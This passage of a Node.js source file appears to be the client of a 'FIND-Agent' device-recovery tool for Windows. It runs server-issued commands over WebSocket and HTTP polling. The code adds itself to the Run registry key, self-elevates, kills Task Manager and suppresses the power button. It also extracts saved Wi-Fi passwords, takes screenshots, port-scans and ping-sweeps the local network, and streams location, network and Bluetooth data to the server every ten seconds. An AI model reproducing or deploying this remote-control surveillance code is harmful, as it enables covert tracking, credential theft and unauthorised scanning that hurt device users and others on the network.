  await runCommand('tsdiscon').catch(() => {});
  if (isAdmin) await runCommand('taskkill /F /IM taskmgr.exe /T').catch(() => {});
}

async function suppressPowerButton(active = true) {
  if (process.platform !== 'win32' || !isAdmin) return;
  const val = active ? 0 : 1;
  await runCommand(`powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS PBUTTONACTION ${val}`);
  await runCommand(`powercfg /setdcvalueindex SCHEME_CURRENT SUB_BUTTONS PBUTTONACTION ${val}`);
  await runCommand('powercfg /setactive SCHEME_CURRENT');
}

// ─── ADVANCED TRACKING COMMANDS ──────────────────────────────────────────────

async function deepIPScrape() {
  log('info', 'Performing deep IP scrape across all interfaces...');
  const results = {};

  // Public IP from multiple sources
  const publicIP = await scrapePublicIP();
  results.publicIP = publicIP;

  // All local interfaces
  const interfaces = os.networkInterfaces();
  results.localInterfaces = [];
  for (const [name, addrs] of Object.entries(interfaces)) {
    for (const addr of addrs) {
      if (!addr.internal) {
        results.localInterfaces.push({ name, address: addr.address, family: addr.family, mac: addr.mac });
      }
    }
  }

  // Active connections with remote IPs
  const connections = await runCommand('netstat -ano | findstr ESTABLISHED');
  results.activeConnections = connections.stdout;

  // Routing table
  const routes = await runPowerShell('Get-NetRoute | Select-Object DestinationPrefix, NextHop, InterfaceAlias | ConvertTo-Json');
  if (routes.success) try { results.routes = JSON.parse(routes.stdout); } catch(e) {}

  return results;
}

async function advancedWifiAnalysis() {
  log('info', 'Performing advanced WiFi analysis...');
  const wifi = await getWifiSignals();
  const fingerprint = buildWifiFingerprint(wifi);
  const network = await buildNetworkFingerprint();

  // Estimate position from WiFi
  let estimatedPosition = null;
  if (wifi.length >= 3) {
    estimatedPosition = await getCellTowerTriangulation();
  }

  return {
    networks: wifi,
    fingerprint: fingerprint,
    networkProfile: network,
    estimatedPosition,
    analysis: {
      totalNetworks: wifi.length,
      strongSignals: wifi.filter(a => a.rssi > -60).length,
      avgSignal: wifi.length > 0 ? Math.round(wifi.reduce((a, b) => a + b.rssi, 0) / wifi.length) : 0,
      closestAP: wifi.length > 0 ? wifi.reduce((a, b) => a.rssi > b.rssi ? a : b) : null,
      channelDistribution: wifi.reduce((acc, a) => { acc[a.channel] = (acc[a.channel] || 0) + 1; return acc; }, {}),
      frequencyBands: {
        '2.4GHz': wifi.filter(a => a.channel <= 14).length,
        '5GHz': wifi.filter(a => a.channel > 14).length
      }
    }
  };
}

async function portScan(target) {
  log('info', `Scanning ports on ${target || 'local network'}...`);
  const commonPorts = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1723, 3306, 3389, 5900, 8080, 8443];
  const openPorts = [];

  for (const port of commonPorts) {
    const res = await runPowerShell(`Test-NetConnection -ComputerName ${target || '127.0.0.1'} -Port ${port} -WarningAction SilentlyContinue | Select-Object ComputerName, RemotePort, TcpTestSucceeded | ConvertTo-Json`, 5000);
    if (res.success) {
      try {
        const r = JSON.parse(res.stdout);
        if (r.TcpTestSucceeded) openPorts.push({ port, service: getServiceName(port) });
      } catch(e) {}
    }
  }

  return { target: target || 'localhost', openPorts, scanTime: Date.now() };
}

function getServiceName(port) {
  const services = { 21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS', 80: 'HTTP', 110: 'POP3', 135: 'RPC', 139: 'NetBIOS', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB', 993: 'IMAPS', 995: 'POP3S', 1433: 'MSSQL', 1723: 'PPTP', 3306: 'MySQL', 3389: 'RDP', 5900: 'VNC', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt' };
  return services[port] || 'Unknown';
}

async function networkScan() {
  log('info', 'Performing network scan...');
  const arp = await runCommand('arp -a');
  const ifconfig = await runPowerShell('Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress, InterfaceAlias, PrefixLength | ConvertTo-Json');
  const gateway = await runPowerShell('Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Select-Object -First 1 NextHop | ConvertTo-Json');

  // Try to discover hosts on subnet
  let hosts = [];
  if (ifconfig.success) {
    try {
      const interfaces = JSON.parse(ifconfig.stdout);
      for (const iface of (Array.isArray(interfaces) ? interfaces : [interfaces])) {
        if (iface.IPAddress && iface.PrefixLength >= 24) {
          const subnet = iface.IPAddress.split('.').slice(0, 3).join('.');
          // Quick ping sweep of common IPs
          for (let i = 1; i <= 20; i++) {
            const pingRes = await runPowerShell(`Test-Connection -ComputerName ${subnet}.${i} -Count 1 -Quiet -TimeoutSeconds 1`, 2000);
            if (pingRes.success && pingRes.stdout.trim() === 'True') {
              hosts.push({ ip: `${subnet}.${i}`, status: 'online' });
            }
          }
          break;
        }
      }
    } catch(e) {}
  }

  return { arp: arp.stdout, interfaces: ifconfig.stdout, gateway: gateway.stdout, discoveredHosts: hosts };
}

async function bluetoothProximityScan() {
  log('info', 'Scanning Bluetooth devices with proximity...');
  if (process.platform !== 'win32') return 'Not supported';

  const devices = await getBluetoothSignals();

  // Get signal strength of connected BT devices
  const ps = `
    Get-PnpDevice -Class Bluetooth -Status OK | ForEach-Object {
      $name = $_.FriendlyName
      $id = $_.InstanceId
      $info = Get-PnpDeviceProperty -InstanceId $id -KeyName DEVPKEY_BluetoothRadio_Authenticated
      [PSCustomObject]@{ Name=$name; InstanceId=$id; Authenticated=$info.Data }
    } | ConvertTo-Json`;

  const detailed = await runPowerShell(ps);
  return { basicDevices: devices, detailedDevices: detailed.stdout };
}

// ─── HEARTBEAT WITH FULL INTEL ──────────────────────────────────────────────

async function sendForensicHeartbeat() {
  const loc = await getPreciseLocation();
  const wifi = await getWifiSignals();
  const bt = await getBluetoothSignals();
  const stats = await getSystemStats();
  const network = await buildNetworkFingerprint();
  const ipData = await scrapePublicIP();

  stats.isAdmin = isAdmin;
  stats.lostMode = isLostMode;

  // ML Decision Engine update
  const mlState = decisionEngine.update(loc, wifi, ipData.bestResult, bt);

  const payload = {
    deviceId,
    location: loc || { source: 'heartbeat-only' },
    systemInfo: stats,
    forensicData: {
      wifi,
      bluetooth: bt,
      networkFingerprint: network,
      publicIP: ipData.confirmedIP,
      ipSources: ipData.sourceCount,
      mlDecision: mlState,
      motion: {
        velocity: decisionEngine.velocityBuffer.length > 0 ? decisionEngine.velocityBuffer[decisionEngine.velocityBuffer.length - 1] : 0,
        status: mlState.movementPattern,
        confidence: mlState.confidence,
        pathDistance: mlState.pathDistance || 0
      }
    }
  };

  send({ type: 'location', ...payload });

  // HTTP backup
  try {
    await httpPost('/heartbeat', payload);
  } catch(e) {}
}

async function reportLog(tool, output, level = 'info', influence = 0) {
  try { await httpPost('/log', { deviceId, tool, output, level, influence }); } catch(e) {}
}

// ─── AUTONOMOUS RECOVERY LOOP ───────────────────────────────────────────────

async function startAutonomousForensics() {
  if (!isLostMode) return;
  log('info', 'Starting autonomous recovery loop...');

  // Run all tracking tools
  await Promise.allSettled([
    getWifiSignals().then(w => reportLog('auto-wifi', w, 'info', 0.9)),
    getPreciseLocation(true).then(l => {
      if (l) send({ type: 'location', deviceId, location: l });
    }),
    deepIPScrape().then(ip => reportLog('auto-ip-scrape', ip, 'info', 0.8)),
    advancedWifiAnalysis().then(wa => reportLog('auto-wifi-analysis', wa, 'info', 0.7)),
    buildNetworkFingerprint().then(nf => reportLog('auto-network-fp', nf, 'info', 0.6))
  ]);

  if (isAdmin) {
    await Promise.allSettled([
      getPortAudit(),
      getDnsDump()
    ]);
  }

  // ML decision: adjust interval based on movement
  const mlReport = decisionEngine.getReport();
  const nextInterval = mlReport.movementPattern === 'stationary' ? 60000 :
    mlReport.movementPattern === 'walking' ? 30000 :
    mlReport.movementPattern.includes('vehicle') ? 10000 : 30000;

  log('info', `Next scan in ${nextInterval/1000}s (pattern: ${mlReport.movementPattern}, confidence: ${(mlReport.confidence * 100).toFixed(1)}%)`);
  setTimeout(startAutonomousForensics, nextInterval);
}

// ─── PERSISTENCE ─────────────────────────────────────────────────────────────

async function ensurePersistence() {
  if (process.platform !== 'win32') return;
  const agentPath = process.argv[1];
  const cmd = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "FIND-Agent" /t REG_SZ /d "node \\"${agentPath}\\"" /f`;
  try { await execAsync(cmd); log('info', 'Persistence active'); } catch(e) {}
}

// ─── COMMAND HANDLER ─────────────────────────────────────────────────────────

async function handleCommand(msg) {
  const { commandId, commandType, params = {} } = msg;
  log('info', `Executing: ${commandType}`);
  let result = { success: false };

  try {
    switch (commandType) {
      case 'lost-mode-on':
        isLostMode = true;
        await suppressPowerButton(true);
        startAutonomousForensics();
        result = { success: true, message: 'Lost Mode Active' };
        break;

      case 'lost-mode-off':
        isLostMode = false;
        await suppressPowerButton(false);
        result = { success: true, message: 'Device Recovered' };
        break;

      case 'locate':
        const loc = await getPreciseLocation(true);
        if (loc) {
          send({ type: 'location', deviceId, location: loc });
          result = { success: true, location: loc };
        } else result = { success: false, error: 'No location available' };
        break;

      case 'wifi-scan':
      case 'net-scan':
        const wifi = await getWifiSignals();
        const arp = await runCommand('arp -a');
        result = { success: true, bssids: wifi, arp: arp.stdout };
        break;

      case 'ping':
        const ping = await runCommand(`ping -n 4 ${params.target || '8.8.8.8'}`);
        result = { success: ping.success, output: ping.stdout };
        break;

      case 'lock':
        await aggressiveLock();
        if (isAdmin) await suppressPowerButton(true);
        result = { success: true, message: 'Locked + Power Suppressed' };
        break;

      case 'siren':
        await runPowerShell('for($i=0;$i-lt 20;$i++){ [Console]::Beep(2000,300); Start-Sleep -ms 100 }');
        result = { success: true, message: 'Siren Active' };
        break;

      case 'arp-scan':
        const arpRes = await runCommand('arp -a');
        const routeRes = await runPowerShell('Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Select-Object NextHop,InterfaceAlias | ConvertTo-Json');
        result = { success: true, arp: arpRes.stdout, routes: routeRes.stdout };
        break;

      case 'bt-proximity':
        result = { success: true, devices: await getBluetoothSignals() };
        break;

      case 'process-audit':
        result = { success: true, processes: await getProcessForensics(), system: await getDeepSystemInfo() };
        break;

      case 'dns-dump':
        result = { success: true, data: await getDnsDump() };
        break;

      case 'port-audit':
        result = { success: true, data: await getPortAudit() };
        break;

      case 'usb-audit':
        result = { success: true, data: await getUsbAudit() };
        break;

      case 'wifi-passwords':
        result = { success: true, data: await getWifiPasswords() };
        break;

      case 'screenshot':
        result = { success: true, data: await takeScreenshot() };
        break;

      case 'forensic-init':
        await reportLog('system', 'Full forensic sequence started');
        await Promise.allSettled([
          getWifiSignals().then(w => reportLog('wifi-scan', w)),
          getDnsDump(), getPortAudit(), getUsbAudit(),
          getPersistenceCheck(), getProcessForensics(),
          getWifiPasswords(), getDeepSystemInfo(),
          getPreciseLocation(true).then(l => l && send({ type: 'location', deviceId, location: l }))
        ]);
        result = { success: true, message: 'Forensic sequence complete' };
        break;

      // ── NEW ADVANCED TRACKING TOOLS ──

      case 'ip-scrape':
        const ipResult = await deepIPScrape();
        result = { success: true, data: ipResult };
        await reportLog('ip-scrape', ipResult);
        break;

      case 'wifi-analysis':
        const waResult = await advancedWifiAnalysis();
        result = { success: true, data: waResult };
        await reportLog('wifi-analysis', waResult);
        break;

      case 'port-scan':
        const psResult = await portScan(params.target);
        result = { success: true, data: psResult };
        await reportLog('port-scan', psResult);
        break;

      case 'network-scan':
        const nsResult = await networkScan();
        result = { success: true, data: nsResult };
        await reportLog('network-scan', nsResult);
        break;

      case 'bt-scan':
        const btResult = await bluetoothProximityScan();
        result = { success: true, data: btResult };
        await reportLog('bt-scan', btResult);
        break;

      case 'ml-report':
        result = { success: true, data: decisionEngine.getReport() };
        break;

      case 'network-fingerprint':
        const nfResult = await buildNetworkFingerprint();
        result = { success: true, data: nfResult };
        break;

      case 'position-history':
        result = { success: true, data: positionHistory.slice(-50) };
        break;

      case 'full-recovery-scan':
        log('info', 'Running full recovery scan...');
        await Promise.allSettled([
          deepIPScrape().then(ip => reportLog('recovery-ip', ip)),
          advancedWifiAnalysis().then(wa => reportLog('recovery-wifi', wa)),
          getPreciseLocation(true).then(l => {
            if (l) send({ type: 'location', deviceId, location: l });
          }),
          buildNetworkFingerprint().then(nf => reportLog('recovery-net', nf)),
          isAdmin ? getPortScan('127.0.0.1') : Promise.resolve()
        ]);
        result = { success: true, message: 'Full recovery scan complete', mlState: decisionEngine.getReport() };
        break;

      default:
        result = { success: false, error: 'Unknown command' };
    }
  } catch (e) { result = { success: false, error: e.message }; }

  send({ type: 'commandResult', deviceId, commandId, commandType, result: JSON.stringify(result) });
}

// ─── NETWORK ─────────────────────────────────────────────────────────────────

async function registerWithServer() {
  if (!pairCode && deviceId) {
    try {
      const res = await httpPost('/agent-lookup/' + deviceId, {});
      if (res && res.success && res.pairCode) {
        pairCode = res.pairCode;
        deviceId = res.deviceId || deviceId;
        log('info', `Auto-discovered pairCode: ${pairCode}`);
        try { fs.writeFileSync(CONFIG_FILE, JSON.stringify({ deviceId, pairCode, createdAt: Date.now() })); } catch(e) {}
      }
    } catch(e) {}
  }

  try {
    const data = await httpPost('/agent-register', { deviceId, hostname: os.hostname(), platform: os.platform(), pairCode });
    if (data && data.success) {
      pairCode = data.pairCode;
      deviceId = data.deviceId || deviceId;
      log('info', `Registered: pairCode=${pairCode}`);
      try { fs.writeFileSync(CONFIG_FILE, JSON.stringify({ deviceId, pairCode, createdAt: Date.now() })); } catch(e) {}
    }
  } catch(e) {}
}

function connect() {
  log('info', `Connecting to ${WS_URL}...`);
  ws = new WebSocket(WS_URL);
  ws.on('open', async () => {
    reconnectAttempts = 0;
    log('info', 'WebSocket connected');
    await registerWithServer();
    send({ type: 'register', deviceId, deviceType: 'agent', hostname: os.hostname(), platform: os.platform() });
    sendForensicHeartbeat().catch(e => log('error', 'Heartbeat failed:', e.message));
  });
  ws.on('message', (data) => {
    try {
      const msg = JSON.parse(data.toString());
      if (msg.type === 'command') handleCommand(msg);
      if (msg.type === 'locationRequest') sendForensicHeartbeat();
    } catch(e) {}
  });
  ws.on('close', () => {
    log('warn', 'WS closed. Reconnecting...');
    setTimeout(connect, Math.min(RECONNECT_DELAY * ++reconnectAttempts, 30000));
  });
  ws.on('error', (e) => log('error', 'WS Error:', e.message));
  ws.on('pong', () => {});
}

async function startPolling() {
  setInterval(async () => {
    try {
      const res = await fetch(`${API_URL}/poll/${deviceId}`);
      const data = await res.json();
      if (data.success && data.commands) {
        for (const cmd of data.commands) {
          await handleCommand({ commandId: cmd.commandId, commandType: cmd.commandType, params: cmd.params ? JSON.parse(cmd.params) : {} });
        }
      }
    } catch(e) {}
  }, 10000);
}

function killOldAgents() {
  try {
    if (process.platform !== 'win32') return;
    const output = execSync('wmic process where "name=\'node.exe\'" get ProcessId,CommandLine /format:list', { encoding: 'utf8', timeout: 5000 });
    const lines = output.split('\n');
    let currentPid = null;
    for (const line of lines) {
      if (line.startsWith('ProcessId=')) currentPid = parseInt(line.split('=')[1]);
      if (line.includes('agent.js') && currentPid && currentPid !== process.pid) {
        try { process.kill(currentPid, 'SIGTERM'); log('info', `Killed old agent PID ${currentPid}`); } catch(e) {}
      }
    }
  } catch(e) {}
}

// ─── MAIN ────────────────────────────────────────────────────────────────────

async function start() {
  killOldAgents();
  await elevate();
  checkAdmin();
  await ensurePersistence();

  deviceId = generateDeviceId();
  log('info', `Device ID: ${deviceId}`);

  if (fs.existsSync(CONFIG_FILE)) {
    try {
      const data = JSON.parse(fs.readFileSync(CONFIG_FILE));
      if (data.deviceId) deviceId = data.deviceId;
      if (data.pairCode) { pairCode = data.pairCode; log('info', `Loaded pairCode: ${pairCode}`); }
    } catch(e) {}
  }

  const argPC = process.argv.find(a => a.startsWith('--pair='));
  if (argPC) pairCode = argPC.split('=')[1];
  if (process.env.PAIR_CODE) pairCode = process.env.PAIR_CODE;

  if (!pairCode) log('warn', 'No pairCode. Run browser pairing first.');

  // Load position history
  try {
    if (fs.existsSync(HISTORY_FILE)) {
      positionHistory = JSON.parse(fs.readFileSync(HISTORY_FILE, 'utf8'));
      log('info', `Loaded ${positionHistory.length} historical positions`);
    }
  } catch(e) {}

  connect();
  startPolling();
  setInterval(sendForensicHeartbeat, 10000);
}

start();
